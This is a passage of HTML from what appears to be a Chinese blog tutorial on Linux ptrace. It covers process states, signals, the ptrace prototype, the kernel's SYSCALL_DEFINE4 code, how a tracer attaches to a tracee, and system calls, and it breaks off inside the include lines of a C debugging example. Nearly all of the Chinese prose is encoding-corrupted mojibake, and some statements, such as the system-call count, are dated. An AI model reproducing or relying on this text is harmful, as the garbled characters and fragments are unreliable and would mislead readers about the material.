title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h3><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹çŠ¶æ€é™¤äº†æˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„TASK_RUNNINGï¼ŒTASK_INTERRUPTIBLEï¼ŒTASK_STOPPEDç­‰ï¼Œè¿˜æœ‰ä¸€ä¸ªTASK_TRACEDï¼Œè€ŒTASK_TRACEDå°†è°ƒè¯•ç¨‹åºæ–­ç‚¹æˆä¸ºå¯èƒ½ã€‚</p><ol><li><strong>R (TASK_RUNNING)ï¼Œå¯æ‰§è¡ŒçŠ¶æ€ã€‚</strong></li><li><strong>S (TASK_INTERRUPTIBLE)ï¼Œå¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ã€‚</strong></li><li><strong>D (TASK_UNINTERRUPTIBLE)ï¼Œä¸å¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ã€‚</strong></li><li><strong>T (TASK_STOPPED or TASK_TRACED)ï¼Œæš‚åœçŠ¶æ€æˆ–è·Ÿè¸ªçŠ¶æ€ã€‚</strong></li></ol><p>å½“ä½¿ç”¨äº†ptraceè·Ÿè¸ªåï¼Œæ‰€æœ‰å‘é€ç»™è¢«è·Ÿè¸ªçš„å­è¿›ç¨‹çš„ä¿¡å·(é™¤äº†SIGKILL)ï¼Œéƒ½ä¼šè¢«è½¬å‘ç»™çˆ¶è¿›ç¨‹ï¼Œè€Œå­è¿›ç¨‹åˆ™ä¼šè¢«é˜»å¡ï¼Œè¿™æ—¶å­è¿›ç¨‹çš„çŠ¶æ€å°±ä¼šè¢«ç³»ç»Ÿæ ‡æ³¨ä¸ºTASK_TRACEDï¼Œè€Œçˆ¶è¿›ç¨‹æ”¶åˆ°ä¿¡å·åï¼Œå°±å¯ä»¥å¯¹åœæ­¢ä¸‹æ¥çš„å­è¿›ç¨‹è¿›è¡Œæ£€æŸ¥å’Œä¿®æ”¹ï¼Œç„¶åè®©å­è¿›ç¨‹ç»§ç»­è¿è¡Œã€‚</p><p><strong>é‚£ä¹ˆä»€ä¹ˆæ˜¯è¿›ç¨‹ä¿¡å·ï¼Ÿ</strong></p><p>ä¸€ä¸ªä¿¡å·å°±æ˜¯ä¸€æ¡å°æ¶ˆæ¯ï¼Œå®ƒé€šçŸ¥è¿›ç¨‹ç³»ç»Ÿä¸­å‘ç”Ÿäº†ä¸€ä¸ªæŸç§ç±»å‹çš„äº‹ä»¶ï¼Œä¿¡å·æ˜¯å¤šç§å¤šæ ·çš„ï¼Œå¹¶ä¸”ä¸€ä¸ªä¿¡å·å¯¹åº”ä¸€ä¸ªäº‹ä»¶ï¼Œè¿™æ ·æ‰èƒ½åšåˆ°å½“è¿›ç¨‹æ”¶åˆ°ä¸€ä¸ªä¿¡å·åï¼ŒçŸ¥é“åˆ°åº•æ˜¯ä¸€ä¸ªä»€ä¹ˆäº‹ä»¶ï¼Œåº”è¯¥å¦‚ä½•å¤„ç†ï¼ˆä½†æ˜¯è¦ä¿è¯å¿…é¡»è¯†åˆ«è¿™ä¸ªä¿¡å·ï¼‰ï¼Œä¸ªäººç†è§£ä¿¡å·å°±æ˜¯æ“ä½œç³»ç»Ÿè·Ÿè¿›ç¨‹æ²Ÿé€šçš„ä¸€ä¸ªæœ‰ç‰¹æ®Šå«ä¹‰çš„è¯­å¥å§</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡kill  -l  æ¥æŸ¥çœ‹ä¿¡æ¯çš„ç§ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/135454966.png"></p><p>ä¸€å…±62ç§ï¼Œå…¶ä¸­1<del>31æ˜¯éå¯é ä¿¡å·ï¼Œ34</del>64æ˜¯å¯é ä¿¡å·(éå¯é ä¿¡å·æ˜¯æ—©æœŸUnixç³»ç»Ÿä¸­çš„ä¿¡å·ï¼Œåæ¥åˆæ·»åŠ äº†å¯é ä¿¡å·æ–¹ä¾¿ç”¨æˆ·è‡ªå®šä¹‰ä¿¡å·ï¼Œè¿™äºŒè€…ä¹‹é—´å…·ä½“çš„åŒºåˆ«åœ¨ä¸‹æ–‡ä¸­ä¼šæåˆ°)</p><h3 id="ptraceå‡½æ•°çš„å®šä¹‰"><a href="#ptraceå‡½æ•°çš„å®šä¹‰" class="headerlink" title="ptraceå‡½æ•°çš„å®šä¹‰"></a>ptraceå‡½æ•°çš„å®šä¹‰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;       </span><br><span class="line">long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);</span><br></pre></td></tr></table></figure><p>ä¸€å…±æœ‰å››ä¸ªå‚æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- &#96;request&#96;: è¡¨ç¤ºè¦æ‰§è¡Œçš„æ“ä½œç±»å‹ã€‚&#x2F;&#x2F;åè°ƒè¯•ä¼šç”¨åˆ°&#96;PT_DENY_ATTACH&#96;ï¼Œè°ƒè¯•ä¼šç”¨åˆ°&#96;PTRACE_ATTACH&#96;</span><br><span class="line"></span><br><span class="line">- &#96;pid&#96;: è¦æ“ä½œçš„ç›®æ ‡è¿›ç¨‹ID</span><br><span class="line"></span><br><span class="line">- &#96;addr&#96;: è¦ç›‘æ§çš„ç›®æ ‡å†…å­˜åœ°å€</span><br><span class="line"></span><br><span class="line">- &#96;data&#96;: ä¿å­˜è¯»å–å‡ºæˆ–è€…è¦å†™å…¥çš„æ•°æ®</span><br></pre></td></tr></table></figure><p>è¯¦æƒ…è¯·å‚çœ‹manæ‰‹å†Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;ptrace.2.html</span><br></pre></td></tr></table></figure><h3 id="ptraceå‡½æ•°çš„å†…æ ¸å®ç°"><a href="#ptraceå‡½æ•°çš„å†…æ ¸å®ç°" class="headerlink" title="ptraceå‡½æ•°çš„å†…æ ¸å®ç°"></a>ptraceå‡½æ•°çš„å†…æ ¸å®ç°</h3><p>ptraceçš„å†…æ ¸å®ç°åœ¨<code>kernel/ptrace.c</code>æ–‡ä»¶ä¸­ï¼Œç›´æ¥çœ‹å†…æ ¸æ¥å£æ˜¯SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data)</span><br><span class="line">&#123;</span><br><span class="line">        struct task_struct *child;</span><br><span class="line">        long ret;</span><br><span class="line">       </span><br><span class="line">        if (request &#x3D;&#x3D; PTRACE_TRACEME)</span><br><span class="line">        &#123;</span><br><span class="line">            ret &#x3D; ptrace_traceme();</span><br><span class="line">            if (!ret)</span><br><span class="line">                arch_ptrace_attach(current);</span><br><span class="line">                goto out;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        child &#x3D; ptrace_get_task_struct(pid);</span><br><span class="line">        if (IS_ERR(child))</span><br><span class="line">        &#123;</span><br><span class="line">            ret &#x3D; PTR_ERR(child);</span><br><span class="line">            goto out;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        if (request &#x3D;&#x3D; PTRACE_ATTACH || request &#x3D;&#x3D; PTRACE_SEIZE) &#123;</span><br><span class="line">            ret &#x3D; ptrace_attach(child, request, addr, data);</span><br><span class="line">            &#x2F;*</span><br><span class="line">             * Some architectures need to do book-keeping after</span><br><span class="line">             * a ptrace attach.</span><br><span class="line">             *&#x2F;</span><br><span class="line">            if (!ret)</span><br><span class="line">                arch_ptrace_attach(child);</span><br><span class="line">            goto out_put_task_struct;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        ret &#x3D; ptrace_check_attach(child, request &#x3D;&#x3D; PTRACE_KILL ||request &#x3D;&#x3D; PTRACE_INTERRUPT);</span><br><span class="line">        if (ret &lt; 0)</span><br><span class="line">            goto out_put_task_struct;</span><br><span class="line">        ret &#x3D; arch_ptrace(child, request, addr, data);</span><br><span class="line">        if (ret || request !&#x3D; PTRACE_DETACH)</span><br><span class="line">            ptrace_unfreeze_traced(child);</span><br><span class="line">    </span><br><span class="line">         out_put_task_struct:</span><br><span class="line">            put_task_struct(child);</span><br><span class="line">         out:</span><br><span class="line">            return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥çœ‹åˆ°æ•´ä¸ªä»£ç é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå…¶ä¸­å¯¹PTRACE_TRACEMEå’ŒPTRACE_ATTACH æ˜¯åšç‰¹æ®Šå¤„ç†çš„ï¼Œå…¶ä»–çš„å°±æ˜¯å¯¹cpuæ¶æ„çš„ç›¸å…³çš„äº†ã€‚</p><h2 id="ptraceä½¿ç”¨åœºæ™¯"><a href="#ptraceä½¿ç”¨åœºæ™¯" class="headerlink" title="ptraceä½¿ç”¨åœºæ™¯"></a>ptraceä½¿ç”¨åœºæ™¯</h2><h3 id="1-è°ƒè¯•ï¼š"><a href="#1-è°ƒè¯•ï¼š" class="headerlink" title="1.è°ƒè¯•ï¼š"></a>1.è°ƒè¯•ï¼š</h3><p>å› ä¸ºè¿›è¡Œä¸€æ¬¡é€†å‘å·¥ç¨‹çš„æ—¶å€™ï¼Œä¼šå¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€æ–­ç‚¹è°ƒè¯•ï¼Œæ¥å¸®åŠ©æˆ‘ä»¬è·Ÿè¿›æˆ‘ä»¬å…³æ³¨çš„åˆ‡å…¥ç‚¹ï¼Œå› ä¸ºè¦è®©äººè„‘æ¥è¿›è¡Œæ¨æ¼”ä¸€å¤§é•¿ä¸²æ±‡ç¼–æŒ‡ä»¤è¿è¡Œç»“æœæ˜¾ç„¶æ˜¯ä¸å¯èƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦è®©æœºå™¨æ¥ä»£æ›¿æˆ‘ä»¬è¿ç®—ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨åˆé€‚çš„èŠ‚ç‚¹ä¸‹æ–­ç‚¹ï¼Œæ¥è§‚å¯Ÿã€‚</p><p>è€Œprtaceæ—¢èƒ½ç”¨ä½œè°ƒè¯•ï¼Œä¹Ÿèƒ½ç”¨ä½œåè°ƒè¯•ï¼Œå½“ä¼ å…¥çš„requestä¸åŒæ—¶ï¼Œå°±å¯ä»¥åˆ‡æ¢åˆ°ä¸åŒçš„åŠŸèƒ½äº†</p><p><strong>åŸç†</strong></p><p>å½“ä¼ å…¥çš„requestå‚æ•°ä¸ºPTRACE_ATTACHï¼Œå°±ä¼šèµ·åˆ°è°ƒè¯•åŠŸèƒ½</p><p>åœ¨ä½¿ç”¨<code>ptrace</code>ä¹‹å‰éœ€è¦åœ¨ä¸¤ä¸ªè¿›ç¨‹é—´å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œå…¶ä¸­traceå¯ä»¥ä¸åšä»»ä½•äº‹ï¼Œä¹Ÿå¯ä½¿ç”¨<code>prctl</code>å’Œ<code>PTRACE_TRACEME</code>æ¥è¿›è¡Œè®¾ç½®ï¼Œptraceç¼–ç¨‹çš„ä¸»è¦éƒ¨åˆ†æ˜¯tracerï¼Œå®ƒå¯ä»¥é€šè¿‡é™„ç€çš„æ–¹å¼ä¸traceeå»ºç«‹è¿½è¸ªå…³ç³»ï¼Œå»ºç«‹ä¹‹åï¼Œå¯ä»¥æ§åˆ¶traceeåœ¨ç‰¹å®šçš„æ—¶å€™æš‚åœå¹¶å‘tracerå‘é€ç›¸åº”ä¿¡å·ï¼Œè€Œtraceråˆ™é€šè¿‡å¾ªç¯ç­‰å¾…<code>waitpid</code>æ¥å¤„ç†traceeå‘æ¥çš„ä¿¡å·ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/494637309.png"></p><p><strong>å»ºç«‹è¿½è¸ªå…³ç³»</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åœ¨è¿›è¡Œè¿½è¸ªå‰éœ€è¦å…ˆå»ºç«‹è¿½è¸ªå…³ç³»ï¼Œç›¸å…³requestæœ‰å¦‚ä¸‹4ä¸ªï¼š</span><br><span class="line">PTRACE_TRACEMEï¼štraceeè¡¨æ˜è‡ªå·±æƒ³è¦è¢«è¿½è¸ªï¼Œè¿™ä¼šè‡ªåŠ¨ä¸çˆ¶è¿›ç¨‹å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œè¿™ä¹Ÿæ˜¯å”¯ä¸€èƒ½è¢«traceeä½¿ç”¨çš„requestï¼Œå…¶ä»–çš„requestéƒ½ç”±traceræŒ‡å®šã€‚</span><br><span class="line">PTRACE_ATTACHï¼štracerç”¨æ¥é™„ç€ä¸€ä¸ªè¿›ç¨‹traceeï¼Œä»¥å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œå¹¶å‘å…¶å‘é€SIGSTOPä¿¡å·ä½¿å…¶æš‚åœã€‚</span><br><span class="line">PTRACE_SEIZEï¼šåƒPTRACE_ATTACHé™„ç€è¿›ç¨‹ï¼Œä½†å®ƒä¸ä¼šè®©traceeæš‚åœï¼Œaddrå‚æ•°é¡»ä¸º0ï¼Œdataå‚æ•°æŒ‡å®šä¸€ä½ptraceé€‰é¡¹ã€‚</span><br><span class="line">PTRACE_DETACHï¼šè§£é™¤è¿½è¸ªå…³ç³»ï¼Œtraceeå°†ç»§ç»­è¿è¡Œã€‚</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å»ºç«‹å…³ç³»æ—¶ï¼Œtracerä½¿ç”¨å¦‚ä¸‹æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH, pid, 0, 0);</span><br><span class="line">&#x2F;*æˆ–*&#x2F;</span><br><span class="line">ptrace(PTRACE_SEIZE, pid, 0, PTRACE_O_flags); &#x2F;*æŒ‡å®šè¿½è¸ªé€‰é¡¹ç«‹å³ç”Ÿæ•ˆ*&#x2F;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬çš„æ —å­ä¼šç”¨åˆ°execlï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘æœ‰å¿…è¦è¡¥å……ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªæ¦‚å¿µï¼š</p><p><strong>ç³»ç»Ÿè°ƒç”¨</strong></p><p>ä¸ºäº†è®©è¿è¡Œåœ¨ç”¨æˆ·æ€çš„ç¨‹åºèƒ½è®¿é—®è®¡ç®—æœºç³»ç»Ÿçš„å„ç§ç¡¬ä»¶èµ„æºï¼Œåˆå› ä¸ºç¡¬ä»¶èµ„æºæœ‰é™ï¼Œè€Œåœ¨ç°ä»£å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿä¸ŠåŒæ—¶è¿è¡Œçš„å¤šä¸ªè¿›ç¨‹éƒ½éœ€è¦è®¿é—®è¿™äº›èµ„æºï¼Œæ‰€ä»¥ä¸ºäº†æ›´å¥½çš„ç®¡ç†è¿™äº›èµ„æºï¼Œæ‰€æœ‰å¯¹è¿™äº›èµ„æºçš„è®¿é—®éƒ½å¿…é¡»å—æ“ä½œç³»ç»Ÿæ§åˆ¶ã€‚è€Œç¨‹åºè®¿é—®è¿™äº›èµ„æºï¼Œå°±å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥å‘Šè¯‰æ“ä½œç³»ç»Ÿæˆ‘éœ€è¦è®¿é—®å“ªäº›èµ„æºã€‚</p><p>åœ¨linuxä¸­ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯ç”¨æˆ·æ€è®¿é—®å†…æ ¸æ€çš„å”¯ä¸€åˆæ³•æ–¹å¼ï¼Œé™¤å¼‚å¸¸å’Œé™·å…¥å¤–ã€‚</p><p>åœ¨linuxå†…æ ¸ä¸­è®¾ç½®äº†ä¸€ç»„ç”¨äºå®ç°ç³»ç»ŸåŠŸèƒ½çš„å­ç¨‹åºï¼Œç§°ä¸ºç³»ç»Ÿè°ƒç”¨ã€‚ç³»ç»Ÿè°ƒç”¨å’Œæ™®é€šåº“å‡½æ•°è°ƒç”¨éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯ç³»ç»Ÿè°ƒç”¨ç”±æ“ä½œç³»ç»Ÿæ ¸å¿ƒæä¾›ï¼Œè¿è¡Œäº<strong>å†…æ ¸æ€</strong>ï¼Œè€Œæ™®é€šçš„å‡½æ•°è°ƒç”¨ç”±å‡½æ•°åº“æˆ–ç”¨æˆ·è‡ªå·±æä¾›ï¼Œè¿è¡Œäº<strong>ç”¨æˆ·æ€</strong>ã€‚ä¸€èˆ¬çš„ï¼Œè¿›ç¨‹æ˜¯ä¸èƒ½è®¿é—®å†…æ ¸çš„ï¼Œå®ƒä¸èƒ½è®¿é—®å†…æ ¸æ‰€å å†…å­˜ç©ºé—´ä¹Ÿä¸èƒ½è°ƒç”¨å†…æ ¸å‡½æ•°ï¼Œè¿™æ˜¯ç”±äºcpuä¿æŠ¤æœºåˆ¶æ‰€å†³å®šçš„ã€‚</p><p>åº”ç”¨ç¨‹åºè°ƒç”¨å†…æ ¸å‡½æ•°åŸºæœ¬åŸç†ï¼šåº”ç”¨ç¨‹åºéœ€è¦é€šè¿‡åº”ç”¨ç¼–ç¨‹æ¥å£ï¼ˆapiï¼‰æ¥å®ç°è®¿é—®ç¡¬ä»¶èµ„æºåŠŸèƒ½ï¼Œè€Œapiæ¥å£æ˜¯é€šè¿‡é‡Œé¢å°è£…çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå»è°ƒç”¨èƒ½å®ç°è®¿é—®ç¡¬ä»¶èµ„æºåŠŸèƒ½çš„ç›¸åº”çš„å†…æ ¸å­ç¨‹åºï¼Œå…³ç³»å¦‚ä¸‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3406173869.png"></p><p>ä¸€ä¸ªapiåŠŸèƒ½å¯èƒ½éœ€è¦å¾ˆå¤šä¸ªç³»ç»Ÿè°ƒç”¨æ¥å…±åŒå®ç°ï¼Œæœ‰æ—¶å€™ä¸€ä¸ªapiåŠŸèƒ½å®ç°ï¼Œä¹Ÿæœ‰å¯èƒ½æ ¹æœ¬ä¸éœ€è¦ç”¨åˆ°ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™é‡ŒæŠŠapiå’Œç³»ç»Ÿè°ƒç”¨æ··ä¸ºä¸€è°ˆã€‚</p><p>å±‚å±‚é€’è¿›ï¼Œæ¥å®ç°ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„è½¬æ¢ï¼Œç³»ç»Ÿè°ƒç”¨å¥½æ¯”ä¸€ä¸ªåè°ƒè€…ï¼Œæ¥æ²Ÿé€šè¿è¡Œåœ¨ç”¨æˆ·æ€çš„åº”ç”¨ç¨‹åºå’Œè¿è¡Œåœ¨å†…æ ¸æ€çš„ç¨‹åºçš„äº¤äº’ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå†…æ ¸åªæ˜¯å’Œç³»ç»Ÿè°ƒç”¨æ‰“äº¤é“ï¼›è€Œæˆ‘ä»¬ç¨‹åºå‘˜åªéœ€è¦å’Œç›¸åº”çš„apiæ‰“äº¤é“å°±è¡Œï¼Œè€Œä¸ç”¨å»å…³å¿ƒåº•å±‚çš„å…·ä½“ç³»ç»Ÿè°ƒç”¨æ€ä¹ˆå®ç°ï¼Œå› ä¸ºapiå·²ç»æŠŠä¸€åˆ‡ç»†èŠ‚éƒ½å°è£…å¥½äº†ã€‚</p><p>åœ¨linuxä¸‹ï¼Œç³»ç»Ÿè°ƒç”¨æ˜¯é€šè¿‡0x80å®ç°çš„ï¼ŒLinuxä¸‹æœ‰319ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ç³»ç»Ÿè°ƒç”¨çš„å…·ä½“ç»†èŠ‚ï¼š</p><p>å®é™…ä¸Šï¼ŒLinuxä¸­æ¯ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½æœ‰ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨å·ä½œä¸ºå”¯ä¸€çš„æ ‡è¯†ï¼Œå†…æ ¸ç»´æŠ¤ä¸€å¼ ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œsys_call_tableï¼Œè¡¨ä¸­çš„å…ƒç´ æ˜¯ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„èµ·å§‹åœ°å€ï¼Œè€Œç³»ç»Ÿè°ƒç”¨å·å°±æ˜¯ç³»ç»Ÿè°ƒç”¨åœ¨è°ƒç”¨è¡¨çš„åç§»é‡ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬é€šè¿‡ç³»ç»Ÿè°ƒç”¨å·æ¥è°ƒç”¨ç›¸åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨x86ä¸Šï¼Œç³»ç»Ÿè°ƒç”¨å·æ˜¯é€šè¿‡eaxå¯„å­˜å™¨ä¼ é€’ç»™å†…æ ¸çš„ã€‚æ¯”å¦‚forkï¼ˆï¼‰çš„å®ç°ã€‚</p><p>å½“ç„¶å°±ç®—æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬è¿è¡Œåœ¨ç”¨æˆ·æ€çš„åº”ç”¨ç¨‹åºä¹Ÿæ— æ³•ç›´æ¥æ‰§è¡Œå†…æ ¸ä»£ç ï¼Œä¹Ÿä¸èƒ½ç›´æ¥è°ƒç”¨å†…æ ¸ç©ºé—´ä¸­çš„å‡½æ•°ï¼Œå› ä¸ºå†…æ ¸é©»ç•™åœ¨å—ä¿æŠ¤çš„åœ°å€ç©ºé—´ä¸Šã€‚æ‰€æœ‰æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæœºåˆ¶ï¼Œè¿™ä¸ªæœºåˆ¶å°±æ˜¯è½¯ä¸­æ–­ï¼Œé¦–å…ˆï¼Œç”¨æˆ·ç¨‹åºä¸ºç³»ç»Ÿè°ƒç”¨è®¾ç½®å‚æ•°ï¼Œå…¶ä¸­ä¸€ä¸ªå‚æ•°æ˜¯ç³»ç»Ÿè°ƒç”¨ç¼–å·ï¼Œå‚æ•°è®¾ç½®å®Œæˆåï¼Œç¨‹åºæ‰§è¡Œâ€œç³»ç»Ÿè°ƒç”¨â€æŒ‡ä»¤ï¼Œé€šè¿‡è½¯ä¸­æ–­åˆ‡æ¢åˆ°å†…æ ¸æ€æ‰§è¡Œå†…æ ¸ä»£ç ã€‚</p><p>åœ¨x86ç³»ç»Ÿä¸Šçš„è½¯ä¸­æ–­ç”±intäº§ç”Ÿã€‚è¿™ä¸ªæŒ‡ä»¤ä¼šå¯¼è‡´ä¸€ä¸ªå¼‚å¸¸ï¼šäº§ç”Ÿä¸€ä¸ªäº‹ä»¶ï¼Œè¿™ä¸ªäº‹ä»¶ä¼šè‡´ä½¿å¤„ç†å™¨åˆ‡æ¢åˆ°å†…æ ¸æ€å¹¶è·³è½¬åˆ°ä¸€ä¸ªæ–°çš„åœ°å€ï¼Œå¹¶å¼€å§‹æ‰§è¡Œé‚£é‡Œçš„å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œæ­¤æ—¶çš„å¼‚å¸¸å¤„ç†ç¨‹åºå®é™…ä¸Šå°±æ˜¯ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºï¼Œå®ƒä¸ç¡¬ä»¶ä½“ç³»ç»“æ„ç´§å¯†ç›¸å…³ï¼Œæ–°åœ°å€çš„æŒ‡ä»¤ä¼šä¿å­˜ç¨‹åºçš„çŠ¶æ€ä»¥ä¾¿æ¢å¤åˆ°ç”¨æˆ·ç¨‹åºçŠ¶æ€ï¼Œè®¡ç®—å‡ºåº”è¯¥è°ƒç”¨å“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œè°ƒç”¨å†…æ ¸ä¸­å®ç°é‚£ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°ï¼Œæ¢å¤ç”¨æˆ·ç¨‹åºçŠ¶æ€ï¼Œç„¶åå°†æ§åˆ¶æƒè¿”è¿˜ç»™ç”¨æˆ·ç¨‹åºã€‚</p><blockquote><p>å‡è®¾ç”¨nameè¡¨ç¤ºç³»ç»Ÿè°ƒç”¨çš„åç§°ï¼Œé‚£ä¹ˆç³»ç»Ÿè°ƒç”¨å·ä¸ç³»ç»Ÿè°ƒç”¨å“åº”å‡½æ•°çš„å…³ç³»æ˜¯ï¼šä»¥ç³»ç»Ÿè°ƒç”¨å·<code>_NR_name</code>ä½œä¸ºä¸‹æ ‡ï¼Œå¯æ‰¾å‡ºç³»ç»Ÿè°ƒç”¨è¡¨<code>sys_call_table</code>(è§<code>arch/i386/kernel/entry.S</code>)ä¸­å¯¹åº”è¡¨é¡¹çš„å†…å®¹ï¼Œå®ƒæ­£å¥½æ˜¯è¯¥ç³»ç»Ÿè°ƒç”¨çš„å“åº”å‡½æ•°<code>sys_name</code>çš„å…¥å£åœ°å€ã€‚</p></blockquote><p><code>execl()</code>å‡½æ•°å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ä¸º<code>__NR_execve</code>ï¼Œç³»ç»Ÿè°ƒç”¨å€¼ä¸º59ã€‚</p><p>æˆ‘ä»¬æ¥ä»”ç»†çœ‹çœ‹åº“å‡½æ•°execveè°ƒç”¨é“¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/834272689.png"></p><p>ptraceè°ƒè¯•ç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys&#x2F;wait.h&gt;&#x2F;*å¼•å…¥waitå‡½æ•°çš„å¤´æ–‡ä»¶*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;reg.h&gt;&#x2F;* å¯¹å¯„å­˜å™¨çš„å¸¸é‡å€¼è¿›è¡Œå®šä¹‰ï¼Œå¦‚Eaxï¼ŒEBX....... *&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;user.h&gt;&#x2F;*gdbè°ƒè¯•ä¸“ç”¨æ–‡ä»¶ï¼Œé‡Œé¢æœ‰å®šä¹‰å¥½çš„å„ç§æ•°æ®ç±»å‹*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;&#x2F;*å¼•å…¥prtaceå¤´æ–‡ä»¶*&#x2F;</span><br><span class="line">#include&lt;unistd.h&gt;&#x2F;*å¼•å…¥forkå‡½æ•°çš„å¤´æ–‡ä»¶*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;syscall.h&gt; &#x2F;* SYS_write *&#x2F;</span><br><span 